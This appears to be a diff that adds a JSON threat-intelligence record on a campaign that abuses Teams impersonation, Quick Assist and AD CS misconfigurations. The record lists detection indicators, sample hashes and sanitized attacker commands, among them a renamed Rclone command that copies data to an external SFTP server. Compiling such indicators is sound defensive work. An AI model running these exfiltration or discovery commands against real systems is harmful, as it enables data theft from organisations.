@@ -1,0 +1,177 @@
+{
+  "malware_family": "AD CS Abuse via Social Engineering",
+  "threat_actor": "Unattributed",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Threat actors use Microsoft Teams to impersonate IT support, socially engineering users into granting remote access via Quick Assist. They then stage portable runtimes like Bun, Python, or Java to discover and abuse Active Directory Certificate Services (AD CS) misconfigurations (ESC1, ESC8) for privilege escalation.",
+  "mitre_techniques": [
+    "T1566.003",
+    "T1566.004",
+    "T1219",
+    "T1059.003",
+    "T1059.007",
+    "T1036",
+    "T1082",
+    "T1016",
+    "T1057",
+    "T1557",
+    "T1649"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "(?i)\\\\AppData\\\\Roaming\\\\KB[0-9]+\\\\",
+      "context": "Staging directory for portable runtimes and scripts.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "SearchApp.exe",
+      "context": "Renamed Rclone executable used for data exfiltration.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "bun.exe",
+      "context": "Original filename in version info of renamed executable.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "update.exe loader.js",
+      "context": "Staged Bun runtime execution from a remote session. (Sanitized)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "jdk-[...]/bin/java.exe C:\\Users\\[...]\\KB345678\\Main.java",
+      "context": "Staged Java runtime execution from a remote session. (Sanitized)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rclone.exe copy \"[...]\" \"SFTP:[...]\" --sftp-host [...] --sftp-user [...] --sftp-pass [...] --concurrent-transfers 20 --max-age 3y --exclude \"{*.exe,[...]}\"",
+      "context": "Renamed Rclone (SearchApp.exe) copying data to external SFTP server. (Sanitized)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v \"ProductName\"",
+      "context": "Host discovery via staged runtime.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ipconfig /all",
+      "context": "Host discovery via staged runtime.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "tasklist",
+      "context": "Host discovery via staged runtime.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "bun.exe",
+      "context": "Portable JavaScript runtime used to execute attacker scripts.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "java.exe",
+      "context": "Portable Java runtime used to execute attacker scripts.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "uri_path",
+      "value": "/certsrv",
+      "context": "AD CS Web Enrollment for certificate submission/retrieval during ESC8.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "EFSRPC",
+      "context": "Protocol used by PetitPotam to coerce DC machine account authentication.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "*.onmicrosoft.com",
+      "context": "Organization-themed tenant names used for Teams impersonation.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "85b6c424117494d3056e88689dbc94c75e9afdb187a339714043aec0da109f17",
+      "description": "Initial Access Java Script"
+    },
+    {
+      "sha256": "f326201269f1ee2f803ae435317507263bb6e0dbfdeb70bd1bb5446e2e46f001",
+      "description": "Initial Access python script"
+    },
+    {
+      "sha256": "06c5c14f043aee3bcc5843b5f50909623d5c9a6239a7c1fba9cddad4111469e7",
+      "description": "Initial Access python script"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
